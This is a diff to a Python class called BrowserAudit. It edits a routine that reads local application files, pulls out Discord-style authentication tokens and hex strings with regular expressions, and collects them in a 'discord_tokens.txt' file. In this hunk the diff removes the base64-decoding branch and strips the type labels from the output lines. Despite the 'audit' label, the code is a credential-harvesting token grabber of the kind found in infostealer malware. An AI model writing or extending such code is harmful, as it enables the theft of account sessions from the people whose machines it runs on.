@@ -279,36 +279,21 @@ class BrowserAudit:
                         with open(file, 'r', encoding='ISO-8859-1') as f:
                             content = f.read()
 
-                            # Extract plaintext tokens
+                            # Extract all tokens from content
                             tokens = re.findall(token_pattern, content)
                             if tokens:
                                 with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
                                     for token in set(tokens):
-                                        out.write(f"[{app_name}] (plaintext) {token}\n")
+                                        out.write(f"[{app_name}] {token}\n")
                                         found_any = True
 
-                            # Extract base64-encoded tokens
-                            base64_candidates = re.findall(r'[A-Za-z0-9+/]{50,}={0,2}', content)
-                            if base64_candidates:
-                                import base64
-                                with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
-                                    for candidate in set(base64_candidates[:20]):
-                                        try:
-                                            decoded = base64.b64decode(candidate).decode('utf-8', errors='ignore')
-                                            if len(decoded) > 10 and any(c in decoded for c in ['.', '-', '_']):
-                                                out.write(f"[{app_name}] (base64) {candidate}\n")
-                                                out.write(f"[{app_name}] (base64-decoded) {decoded}\n")
-                                                found_any = True
-                                        except:
-                                            pass
-
-                            # Extract potential encrypted/hex tokens
+                            # Extract hex/base64 data
                             hex_candidates = re.findall(hex_pattern, content)
                             if hex_candidates:
                                 with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
                                     for candidate in set(hex_candidates[:20]):
                                         if len(candidate) > 20:
-                                            out.write(f"[{app_name}] (encrypted/hex) {candidate}\n")
+                                            out.write(f"[{app_name}] {candidate}\n")
                                             found_any = True
                     except PermissionError:
                         self.log("WARNING", f"Permission denied reading {file} - try with sudo")
